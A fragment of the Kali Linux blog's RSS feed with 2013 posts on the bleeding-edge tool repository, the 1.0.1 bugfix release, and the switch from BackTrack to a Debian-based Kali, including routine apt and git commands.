100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div></description>
</item>
<item>
<title>Bleeding Edge Kali Linux</title>
<link>https://www.kali.org/blog/bleeding-edge-kali-repositories/</link>
<guid isPermaLink="true">https://www.kali.org/blog/bleeding-edge-kali-repositories/</guid>
<pubDate>Mon, 25 Mar 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/bleeding-edge-kali-repositories/images/kali-bleeding-edge-repo.jpg" type="image/jpg"/>
<description><p>We&rsquo;ve been busy this week, still behind on our emails, but going strong with Kali development. We packaged some <a href="https://bugs.kali.org/">new tools</a> which were pointed out by the community as missing, such as <strong>inguma</strong>, <strong>arachni</strong>, <strong>bully</strong>, <strong>lbd</strong>, <strong>uniscan</strong>, <strong>automater</strong>, as well as started to build a framework of libraries and patches for bluetooth sniffing and ubertooth tools. We also fixed the Kali Menu to be editable again.</p> <p>With over 300 tools in our repository, it&rsquo;s close to impossible for us to keep *every* tool updated to the latest git version, all the time. A good example of this happed a few days ago, when we updated the <strong>SET</strong> package. Two days after we updated the package, we got a &ldquo;tool upgrade&rdquo; request for SET in our bug tracker, as our package was already outdated. Seems a bit extreme? Maybe not, <strong>consider the following conundrum</strong>:</p> <p>You have an audit tommorrow, and you&rsquo;re getting your tools ready. You boot Kali Linux up, run an &ldquo;<strong>apt-get update &amp;&amp; apt-get upgrade</strong>&rdquo; to make sure you&rsquo;re running the latest stable versions of <em>$your_favorate_tool</em>. After the update, you notice that <em>$your_favorate_tool</em> has a package that was updated last week in our repositories. However, in the past week, some pretty awesome updates were added to <em>$your_favorate_tool</em> upstream, and you really need those new features for the upcoming assessment. <strong>What do you do ?</strong></p> <h3 id="worst-thing-to-do">Worst Thing To Do.</h3> <p>Assuming you&rsquo;re not using Kali as a &ldquo;Throw Away Instance&rdquo;, the worst thing to do in this case is to overwrite packaged files. For example, <strong>the following commands to update a tool that gets updated frequently is a big no-no</strong> and will ultimately break your install in the future:</p> <pre><code class="language-sh"># dont update tools like this! cd /usr/share/ rm -rf $your_favorate_tool git clone $your_favorate_tool </code></pre> <h3 id="ok-to-dobut-meh">OK To Do&hellip;but, Meh.</h3> <p>Since you <strong>shouldn&rsquo;t be messing with packaged files</strong>, the most common option is to svn or git checkout <em>$your_favorate_tool</em> in a temporary directory and use it from there as shown below. In most cases, all the dependencies needed for the updated tool will usually already exist in Kali. Alternatively, you could opt to <a href="https://www.kali.org/docs/development/rebuilding-a-package-from-source/">rebuild the source package</a>, which includes your updates and changes:</p> <pre><code class="language-sh">cd ~ mkdir work cd work git clone $your_favorate_tool cd $your_favorate_tool ./your_favorate_tool </code></pre> <h3 id="our-solution">Our Solution.</h3> <p>We said <strong>*close*</strong> to impossible, right? Seeing this clash between the update frequency of some tools and the need (of some people, not everyone) to &ldquo;always have the latest revision of <em>$your_favorate_tool</em>&rdquo;, we came up with an interesting solution. We&rsquo;ve set up an opt-in &ldquo;<strong>Kali bleeding edge</strong>&rdquo; repository which contains daily builds for several useful and frequently updated tools. These repositories are still highly experimental (meaning we expect things to break from time to time until we get more feedback from the community). If you want to try this feature out, you are welcome to add the bleeding edge repository as shown below however, please remember that term &ldquo;<strong>bleeding edge</strong>&rdquo;. There&rsquo;s a reason for the blood:</p> <pre><code class="language-sh">echo deb http://http.kali.org/kali kali-bleeding-edge main contrib non-free &gt;&gt; /etc/apt/sources.list apt-get update apt-get upgrade </code></pre> <p>We currently have a handful of tools in this repository, which include <strong>se-toolkit</strong> (set), <strong>aircrack-ng</strong>, <strong>dnsrecon</strong>, <strong>sqlmap</strong>, <strong>rfidiot</strong>, <strong>beef-xss</strong>, <strong>libnfc</strong>, <strong>libfreefare</strong>, <strong>mfoc</strong> and <strong>mfcuk</strong>. We expect this list to grow with time.</p></description>
</item>
<item>
<title>Kali Linux Release Aftermath</title>
<link>https://www.kali.org/blog/kali-linux-1-0-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-1-release/</guid>
<pubDate>Mon, 18 Mar 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-1-release/images/kali-five-days.jpg" type="image/jpg"/>
<description><p>Five days into the <a href="https://www.kali.org/blog/kali-linux-1-0-0-release/">Kali Linux</a> release at BlackHat EU in Amsterdam, and we&rsquo;re still not fully recovered. Since the release, we&rsquo;ve had just over <strong>90,000 downloads</strong>, a dozen or so package updates, added more articles to the Kali Documentation, started a <a href="https://www.kali.org/docs/">Portuguese translation</a>, and we even managed to squeeze in a small bugfix release (Kali 1.0.1), which resolved an annoying <a href="https://bugs.kali.org/view.php?id=63/">USB keyboard issue</a> some users reported. The responses to Kali so far have been extremely positive and our bug tracker is surely enough filling up with new tool requests. We encourage Open-source tool developers to contact us so that we can work together towards this goal.</p> <p>We have big hopes for our shiny &ldquo;<a href="https://www.kali.org/docs/">Kali Linux Documentation</a>&rdquo; platform and will continue writing up useful articles that serve the Kali community. <del>We have made the effort to automatically generate a PDF offline version of our server for public download</del> (Removed in 2021). <strong>We strongly recommend that even experienced Linux and <a href="https://www.backtrack-linux.org/">BackTrack</a> users take the time to read through this documentation</strong>, as Kali Linux has some unique features which would throw off anyone without a proper understanding of the underlying mechanisms. PDF downloads for additional translated languages will become available soon as translation work speeds ahead.</p> <p>We would like to take this opportunity to thank everyone involved in the past year&rsquo;s development of Kali Linux - <strong>developers, funders, programmers, web designers, translators, community administrators, mirror contributors, and tech writers</strong>, without whom Kali Linux would not have come to light. Extra special thanks to the <a href="https://www.offsec.com/">OffSec</a> team who have dedicated themselves to Kali Linux in the past year and to Rapid 7 for <a href="https://blog.rapid7.com/2013/03/13/metasploit-now-supports-kali-linux-the-evolution-of-backtrack/">supporting our release</a> and officially contributing the Metasploit packages to Kali Linux.</p> <p>We will continue to be responsive to the community through our formal channels, and in turn, hope that through this new interaction, the community will help grow, and continually improve, Kali Linux.</p></description>
</item>
<item>
<title>Kali Linux 1.0 Release - Moto - The Birth of Kali Linux</title>
<link>https://www.kali.org/blog/kali-linux-1-0-0-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-0-release/</guid>
<pubDate>Wed, 13 Mar 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-0-release/images/kali-the-birth.jpg" type="image/jpg"/>
<description><h2 id="kali-linux-the-rising">Kali Linux, the rising</h2> <p>It&rsquo;s been 7 years since we released our first version of <a href="https://www.backtrack-linux.org/">BackTrack Linux</a>, and the ride so far has been exhilarating. When the dev team started talking about BackTrack 6 (almost a year ago), each of us put on paper a few &ldquo;wish list goals&rdquo; that we each wanted implemented in our &ldquo;next version&rdquo;.</p> <h3 id="scrapping-it-all-and-starting-afresh">Scrapping it all and starting afresh</h3> <p>It soon became evident to us that with our 4 year old development architecture, we would not be able to achieve all these new goals without a massive restructure, so, <strong>we massively restructured</strong>. We realized it would be easier to start afresh, using new technologies and processes than to try to patch up our existing environment to conform to Debian policies and FSH. This realization brought upon the next question&hellip;</p> <h3 id="ubuntu-vs-debian">Ubuntu vs. Debian</h3> <p>Once we realized we are free from the bonds of our old environment, we started musing about the base platform we want to build our next penetration testing distribution - the main players on our table were Debian and Ubuntu. With both options heavily weighed and gently avoiding philosophical rants about the pros and cons of each, Debian was our final choice.</p> <h3 id="what-about-the-offsec-courses">What about the OffSec courses?</h3> <p>Surprisingly enough, with all the new changes we have made in Kali, the user experience remains pretty much the same. Apart from a couple of path changes due to our new FHS compliance, our students should feel little difference between Kali and BackTrack.</p> <h3 id="wheres-my-pentest">Where&rsquo;s my /pentest?</h3> <p>Gone. Kaput. Kwisha. Dissipated. FSH compliance has removed the <em><strong>/pentest</strong></em> structure from our distribution. Although the <em><strong>/pentest</strong></em> directory tree was a signature of our previous distributions for many years, it always brought with it policy questions which could never be satisfactorily answered. For example, when does a tool go in <em><strong>/pentest</strong></em>, and when should it be placed in the $PATH? Where should a tool like &ldquo;sqlmap&rdquo; be placed? Should it be in <em><strong>/pentest/web</strong></em>, or <em><strong>/pentest/database</strong></em>? With our new FSH compliant packages, there&rsquo;s no guesswork left. Everything is in the path and accessible directly, as it should be.</p> <h3 id="kali-linux---whats-in-a-name">Kali Linux - what&rsquo;s in a name?</h3> <p>Hindu Goddess of time and change? Philippine martial art? Cool word in Swahili? None of the above. &ldquo;Kali&rdquo; is simply the name we came up with for our new distribution. Why change the name in the first place? With all these significant changes in our distribution, we felt that we needed to convey this in the project name. &ldquo;BackTrack 6&rdquo; didn&rsquo;t do justice to our efforts in the past year, and wouldn&rsquo;t convey our new message to our users. What&rsquo;s the new message? We&rsquo;ll let you find out for yourself.</p></description>
</item>
<item>
<title>What's New in Kali Linux?</title>
<link>https://www.kali.org/blog/kali-linux-whats-new/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-whats-new/</guid>
<pubDate>Wed, 13 Mar 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-whats-new/images/kali-whats-new.jpg" type="image/jpg"/>
<description><h2 id="enter-kali-linux">Enter Kali Linux</h2> <p>&ldquo;<strong>So, what&rsquo;s the difference between <a href="https://www.backtrack-linux.org/">BackTrack</a> and Kali?</strong>&rdquo; you might be asking. Unfortunately for us, that&rsquo;s not a simple question to answer. It&rsquo;s a mix between &ldquo;everything&rdquo; and &ldquo;not much&rdquo;, depending on how you used BackTrack.</p> <p>From an end user perspective, the most obvious change would be the switch to Debian and an FHS-compliant system. What this means is that instead of having to navigate through the <strong>/pentest</strong> tree, you will be able to call any tool from anywhere on the system as every application is included in the system path. However, there&rsquo;s much hidden magic in that last sentence. I&rsquo;ll quickly list some of the new benefits of this move.</p> <h3 id="streaming-security-and-package-updates-from-debian">Streaming Security and Package Updates From Debian</h3> <p>Our new streamlined repositories synchronize with the <a href="https://www.debian.org/">Debian</a> repositories 4 times a day, constantly providing you with the latest package updates and security fixes available.</p> <h3 id="debian-compliant-packaging-of-each-tool-in-kali">Debian Compliant Packaging of Each Tool in Kali</h3> <p>This is where we&rsquo;ve been spending most of our time and effort. Relentlessly packaging dozens of useful tools, painstakingly making sure our packages are Debian compliant.</p> <h3 id="long-term-packaging-and-maintenance-of-high-profile-tools">Long Term Packaging and Maintenance of High Profile Tools</h3> <p>Many of the tools in our toolbox need to be &ldquo;bleeding edge&rdquo;. This means we have take on the task of packaging and maintaining upstream versions of many tools, so that our users are constantly kept up to date where it matters.</p> <h3 id="streamlined-development-process">Streamlined Development Process</h3> <p>As our source packages are now also Debian compliant, you can quickly and easily get the required sources of each tool, then modify and rebuild them with a couple of commands.</p> <h3 id="bootstrap-builds-and-iso-customizations">Bootstrap Builds and ISO Customizations</h3> <p>One of the many benefits of our move to a Debian compliant system, is the ability to Bootstrap a Kali Installation/ISO directly from our repositories. This means that you can easily <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/">build your own customizations of Kali</a>, as well as perform <a href="https://www.kali.org/docs/installation/network-pxe/">enterprise network installs</a> from a local or remote repository.</p> <h3 id="automating-kali-installations">Automating Kali Installations</h3> <p>Kali Linux installations can now be automated using pre-seed files. This allows for enterprise wide customization and deployment on multiple systems.</p> <h3 id="real-arm-development">Real ARM Development</h3> <p>BackTrack 5 brought with it new support for ARM hardware. Our ARM build-bot was a modified Motorola Xoom tablet, which suffice to say, didn&rsquo;t last for long. To help remedy this, <a href="https://www.offsec.com/">OffSec</a> has donated a Calxeda ARM cluster to our project, allowing reliable and long term development of Kali Linux ARM images.</p> <h3 id="complete-desktop-environment-flexibility">Complete Desktop Environment Flexibility.</h3> <p>Our new build and repository environments allow for complete flexibility in generating your own updated Kali ISOs, with any desktop environment you like. Do you prefer KDE? LXDE? XFCE? Anything else? Then <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/">change your Kali desktop environment</a> yourself.</p> <h3 id="seamless-upgrades-between-future-major-versions">Seamless Upgrades Between Future Major Versions</h3> <p>Another benefit derived from the move to a Debian compliant system is the ability to seamlessly upgrade future major version of Kali. No longer will you have to reinstall your penetration testing machine due a new version of Kali coming out.</p> <p>With all these changes (and many more), you can see why we&rsquo;re so excited about this release. Go ahead and give Kali a spin. Head on to the <a href="https://www.kali.org/docs/">documentation area</a> for some setup guides, and then over to our <a href="https://forums.kali.org/">forums</a> and join the new Kali community!</p></description>
</item>
</channel>
</Mr A viral 3911
</b>
</body>
</html>